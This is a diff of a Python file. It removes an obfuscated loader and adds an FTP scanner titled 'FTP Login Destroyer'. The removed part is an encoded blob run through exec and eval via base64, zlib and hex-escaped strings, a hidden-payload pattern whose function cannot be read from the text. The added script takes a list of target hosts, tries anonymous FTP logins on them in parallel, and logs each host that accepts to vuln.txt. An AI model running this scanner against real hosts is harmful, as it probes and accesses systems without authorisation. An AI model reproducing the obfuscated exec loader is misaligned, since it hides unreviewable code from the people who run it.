@@ -1,7 +1,112 @@
-#pip install pycryptodome  , It works only v3.11 Above.
-import random ,base64,codecs,zlib;pyobfuscate=""
+from ftplib import FTP
+import socket
+import time
+import threading
+import logging
+from colorama import Fore, Style, init
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(builtins)'],['''6Z6v2X)bUHZOl7RUnfr8@!Q$0Ar0%5$TPuRnuQrIkR$sEpgP4(b0gNYx`sH)Y7QGCN-9iKetDk*=r%$>+5%wV<-Yk>83VgF#sHH`h_vW)K=AwQTkedrl=Y3i6i8lMTurb`HJgfWZiz%~;7E;H_|59A{Ot`9t_e>)JAha`cDCUx|Io()@;fWU<DmpPNNED<kS&P4-q{diRBKB?PjLJsH@s^4x!GEatJE3`WWT_*^oT|`9I0>{IL8}?<YgOe&R!%G=Axv*^$a0=xVjR@*3jTU8+1qw94gpgBFd)i?El2%I}&1r=c4e+i&edVTT961x8jr+W*ObW><H1844c84VfO(&O5R7B*AOLUA<GFG^Vj(xr1e;Z?Jn5&p%+8bzK9Wa`miz%UJJXn#e89S^KtB`a-$^CFLgZ6hKVJmSph>Wi4;};%<x#mB^=2{bJX2AB1f|ncwUBiLFbekEqn6V;ADTbUS!4vzANKVkHwNK*KpPU<(2E**S`OcsNE4~8zPdTq0SG29{x>1reaLONtdG&OeGgkt5U?4PAy^xxo?6`-bJgVYTCkLLN=Tux@1{}mt~z_W3xw?X~M=OAM%B9#4GaM(FL#1{B7QQ?|&{tQ1VRZX$UI@7%y5YU`ioiC>k#`COaAg0Q{-s8QPS3QBdpdk}wc^9>vL_`|%d<FPL+vh)CrVU|H)-weuL&eev%!sO3VVd395E_fLF+Bg&h+{6TAcje6}mVc#pSP)q+*B?kf&FhW`e;=!{~q(sg#e<~L6ry&ZUQ6_VXjaymOQUEchacM=32q6{J?1@P-vkTm7T?wZFK32;j697vF#58>s0j)@~hzR-9lxQ;;3yZ)=E#(ba-{3#8mQ&JAa;FI2d#C*dO@y!!H!j-i8qp@bVu2(A2TahZSY<a;RL{7Ya9;|Ge||q&3-wGxGz891I=a-Co>mW;aRqvQZqqgeugs_>Fe{0f4jj-)SalikOa_^e8Iv3f0Y46Ztn)?hw89|<2k1M$=2fQghI%}qtPr##BT8J%5LDV9#)1n@5^qZL$j7YqkF<*O9q*Gb?Ryebi`Cg~ZCj<`Cb0C4|G~UAwPXm>!cG<bg(yk}Z&SXa)v0|0_S*>7385*x)o<VD)@>bmFBzG|*O34*`QYolk^1=<A2yC=tT`d)zMOHs1jX|FQ0{IGnCj?!yulH&F<BSJS6)Xl*EK7gWk@AJjiF|DAA?G_0tU1o!(ps+SA~ZBs)G+~ktYMM^g1Ca^4zeSKb>1_;^leetZ<}2Me$$T8At$K#__Ka2g@+8B>6m2uPoNY2Z~;4!#djI8Yxv|6UI;n{)X05AKAnF15yuPwkuuMM>7@C0oU3i7qsHHAzI|V-PSs>0-j&-!~_r2t9CrC;D1+Cfq)Atep&anziJi#Ec7m;(l`7AN(lcC4FI+g`}5eZ0ce)RA`S)=CFi(SpoT2n+3;YNpzU$!*0v31@MX_=;S3ELiQA8&1Om01?lu}(;`MV)q)7c$v99GaeuHIObpJ~T*YhGq>K-SPla79L*5iQ_np)@79-6-4%rzJp6%IcgAbI9<@Z*K@_bLpj8XV_fWvM6s81%!7+XM4iCJ|tZLbouF!34Gqo!)0l!={AG)7M;@8RNY^%TXU5AyN}N6E3C?epYIS$&EV5<MA{<9GQn|Mr{J}_AKz`X7pp2IaVA?CF}QI0jwqgWSz~ip2Lmg1EMP4t_H!^UeeZspv1SY`F$<)YwngglCNeaScBlCc4?@kyaz;B)f1oZ6$qx$K3qYyvuSa@^6N&X{CbivjjGFRFd<Q&;KP1bzres17Eve_(mN(V-`a%T69#uj*d)gu6HH=1co+l|@kG?r6}mcbO)(E&)I_TaP8#iDX~BAy-+KdloGD9dx-zo=b|K5IpL<#dQ_Zu4lym1A3wNb%>iNsk=Q--mH6I86wwA=1rd;%^Wl@jS<tOPyu4Jwf=e`!$eyH4RC(ISAK1mR_8+*2tCJ>apT#iMW^S=3SRJUHQs5SZQ2fd4UWs(1akF{sGCGJ5215W$w$ZDV5$B)n^IE?EK1g%K?jWA0_R@CUKP$Akli@D_WzStXAQXz|Mb*Bg&{;?zr+HI9p0XDh=9iN8<0Z5;1`rxpDeJj$fYSLejlFIe6_oz9~(Z}5JZ|5vc`w<nz`w7An@Dq%Kh$P_=sV(iLL(SE7G1MDOUUCxEB#Ieu8WuTS)#wTV_F?+i>BD4Q>aG2U(^I7#=&`{0&pP3`hkYF1{w0iW&J4Vi&d?Q&Ht4XLu~>s<?A0;ngbUMy+rZP^C#I~vepSRZA8;RO9qrec@rR2Zwtm>W9AaGhUK1tl`bd@tKl{UQ!a9MRI3zz|Zlhl5CDnahZPlY6`gr4)hrT<mv(GoJOxn3S*Ue~Kr<b_-2_4=Vs2U<a^U<MP-yHZ8pMR2Y(TG=~6B}J+M*0F}2+A0dXW^dH2CLH`q#G|~{$=(I^jK11bp7F#k_hg^c9_5Q5daS_L{*dH5)spbpc_vfx}>0%lV1a6XZ~0Z;+M#5BYK?hy?eSIv8l{kNNz_G^BO2&hH3p@0BUj58nXnBMXc(|4O^W3>R85-B2}UOP_~xgopxlSIp?bZeH<?(Hb8&>`JFk*QO7~wdd;)p8uQ`8zsHDEx3gT<-H)>Wc`sOk^n1>%ItED@-6qvPwYKGWR3;^>?SRhpQ|r{A+hjo_*$jyCYi>$x<h@z;-F@#tY~xj<=`rIl9|tiHU?0)^-@!H+{MzjFFz8BmWu9hM#{>Ao3nXe?T9yroXlUXweygN}+zinbIA(Nw<CqK4%P-qYKbo4(k3-H9PAFUn1z?PW8V1LbnUQcnoT7&>*VV%@C@d=m9&HV)RP470I%Owy?5<9^%rAwZ2?or%4Hcy2o$>DEbYOufV6DjpsLYuRKGRsR)35jtYu+*X<S56jQbVJ+cs@ZrRPPSU-)#VR(gX*Zko=IxsGSy|LHvHoXEcU(QNKbcIWr+~zxJH13ii~M>i`4P3lv29CjNrTn#M7-v<{R|kehLipd2sJ(E>(*c1#?|hMg<PcVL_$eBkR#EhL_&03L-8o7k%DinR7jqhq!CgpT&|Ez|i4#G|?+_=1Q3nWrJHs<`2A38A|FbDk?8Bb(SZHe_TKzNmq$1_DXd8J;74wxTd%z28-^Wm?B_erd1uaon06A7UTU5TL_%KA%Q$t0mNl)W;FxnjZ3v;8@exn&J5b3Dd6)pP5zuHY*Mqq<9QmyjZ_j7wFPnS+nyDe(=W4m0?d5PpmUHEV$1$Er&7{>hTAv;)=)+;2XJ&4maSPy0(pDvn%lAcsk2JQb#^LrmwfV2`U)c((_akOR)Bx4?-&s58A7*m`5e3#=T>PE}V%|Gy-+C&K1$rwyB{ktY9M0q@Hd=nEHU=dZ&6{9wwg|(S$e&XEc1onNsNp22_T6-Aq?vvI|-CwTHvap047Ic(7Wb(o}92&s>!HQ1mLOGv}%j6=zN;G8pKSnEHIAyQ7F`uZT6y3i|c;!PZdq8a}^mE7~oOpPqBm(s!TawFa}jA83e<!f>>N`?%csIi%Nh>Oqp$yV#=mm-fVQm!aRCBkjr=-T8fqsO~X=zb6Rsc->BCjG4tV6lC=|YsUXQ+~?kIjYPgS$h%Xjpoj_7>^?utcoHyiAs=ZmOGxHHKu<eT?6<B{mDrk?tG8<b!N5FG8@73n$`E=#<%efwHHfJ&iv&*nwJud<0i^&e)ue4=q|yL3D~2mg0LJz<ri#%+LdxGA6TpxMUn*NGX591um{s0lFQ|!xp4($CJ5@w+&pnmYfQrGgTSX3KfLLu}CH<s*FMm_Rdv{D5B-M(+tqB$hghdmGjHFX?16gXm3QWmN-JKf@c<Hg}Udm-sz&>E?;0>#>kyg?S4_j2p2@X)DG&G6pCp^#?ayAbeoWJKG0Pvf5>udl0HvXZuw8b4WO0}rRWU_DA>4beulZ$9dqhOl14AV|cSF@#p_rwn*%zeJ$zQ4i0z8%8h=vM@99Q<0I4}MrQo6FA#Tf+9-_?A~AN-TwRUfd;Ou3r;y+uO6aBe-&%RZ!)CbYqlfYmSU9h8oH}A-M{?f7oX5oliBa6pDki5VnxWau@4^Tfn@6L$!${A9ENrc)(_*m>$jE6sLF~kyHr#n3AX~k&l70RgH|^%=FqZBwE)OLe||=R4?*Gmxl^yNF9&clxj(-CT)CVK?qyLEc6&pK~V!{EO|5MT?hxwV}HWLt9%#5$R0TggkOju0Yi4yG09xuSgo_Fwrbk8evg%?)w#y%T8B&zm{9Z<Cs)H}u)?J`-f**>X-(+vvNFfRub!Gwm8S?8iFe;(k2{h<y4W!3WthY12IkapfWr^V@<!8q2m`E4O$mT5QxJspS-jervstNu(AwaD?r(p20c5$ixVX)Kz?dd?H}o>5GFUzXlOHa&USr(sPU^zoj%Sh8Z+Wnvr8RXcX2vXdz2%SwT<wj}bPgrS1=a?s-T63mp}#&h2Cwf|^X{8A{$Z49DUgJg>g?|!*F<<FpYHK~uVxK{b{)#+kC=lQHlOoCO=jkJc2WLQAO<=Mlzjw@mtBo{MPgqdKg|-g>oa?oWn3fqHA@HL5KT^L_^DT*sX=A?JV_ady4-fyGU#E!k6V5gZ!sS-q}15uR_^IZ=F%9>G;Cn~C(2^t;rINrVMb9B7*pEN&A3iEknxcAbA`{9N_s@V(N23%Lf_pD&b3j!=*s0iiF~}!4!z*<9sF)qcMiScYZJ4)UnwG|Hk}x~G|qhN;#(gj&nstkUyio{nRN-V5*%T#!B1{)!=M26*M@%1>+1C${Q1)8P*t8woUWVd<)jl@VW%@xLj|HHNPlF)Ky9Q0&=Hs1t;Yg{!S5F41$1G#`7)urL|MO4+~p@bO&6t>lvt-FN|Uvg@WSonT?031c|Mq&YBS<Q)cj$7ZDFFVkK{Qn<qm0;X1xp1jveJvf<s~;lE30k'''.replace('\n','')]))
+# Initialize colorama
+init()
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
-                
+# Lock for thread-safe file access
+file_lock = threading.Lock()
+
+# Initialize logger
+logging.basicConfig(filename='error.log', level=logging.ERROR)
+
+def is_port_open(hostname, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        sock.connect((hostname, port))
+        sock.close()
+        return True
+    except socket.timeout:
+        logging.error(f"Connection timeout to {hostname}")
+        return False
+    except ConnectionRefusedError:
+        logging.error(f"Connection refused to {hostname}")
+        return False
+    except Exception as e:
+        logging.error(f"Error connecting to {hostname}: {str(e)}")
+        return False
+
+def test_ftp_login(hostname):
+    if not is_port_open(hostname, 21):
+        print(f"{Fore.YELLOW}Port 21 is not open on {hostname}.{Style.RESET_ALL}")
+        return False
+
+    try:
+        ftp = FTP()
+        ftp.connect(hostname, timeout=3)
+        ftp.login("anonymous", "anonymous")
+        ftp.quit()
+        return True
+    except Exception as e:
+        logging.error(f"FTP error on {hostname}: {str(e)}")
+        return False
+
+def print_header():
+    print(Fore.CYAN + "")
+    print("   FTP Login Destroyer")
+    print("   Created By Joelindra")
+    print(Style.RESET_ALL)
+
+def test_ftp_login_thread(target):
+    success = test_ftp_login(target)
+    if success:
+        print(f"{Fore.GREEN}\nFTP login successful for {target}{Style.RESET_ALL}")
+        with file_lock:
+            with open("vuln.txt", "a") as output_file:
+                output_file.write(target + "\n")
+
+def main():
+    print_header()
+
+    try:
+        target_option = input("Choose an option:\n1. Read targets from a file\n2. Input a single target\n\nInput Here : ")
+
+        if target_option == "1":
+            file_name = input("Enter the name of the file containing target domains (one per line): ")
+            target_list = []
+            with open(file_name, "r") as file:
+                for line in file:
+                    stripped_line = line.strip()
+                    if stripped_line:  # Skip blank lines
+                        stripped_line = stripped_line.replace("http://", "").replace("https://", "")
+                        if stripped_line.endswith("/"):
+                            stripped_line = stripped_line[:-1]  # Remove trailing "/"
+                        target_list.append(stripped_line)
+        elif target_option == "2":
+            target = input("Enter a single target hostname or IP address: ").replace("http://", "").replace("https://", "")
+            if target.endswith("/"):
+                target = target[:-1]  # Remove trailing "/"
+            target_list = [target]
+        else:
+            print("Invalid option.")
+            return
+
+        threads = []
+
+        animation_characters = "|/-\\"
+        animation_index = 0
+        for target in target_list:
+            for i in range(10):
+                print(f"{Fore.MAGENTA}{animation_characters[animation_index]}{Style.RESET_ALL}", end="\r")
+                time.sleep(0.2)
+                animation_index = (animation_index + 1) % 4
+
+            thread = threading.Thread(target=test_ftp_login_thread, args=(target,))
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+        print(f"{Fore.GREEN}\nAll tests completed. Successfully logged in targets written to vuln.txt.{Style.RESET_ALL}")
+
+    except KeyboardInterrupt:
+        print("\nKeyboardInterrupt: Program terminated by user.")
+
+if __name__ == "__main__":
+    main()
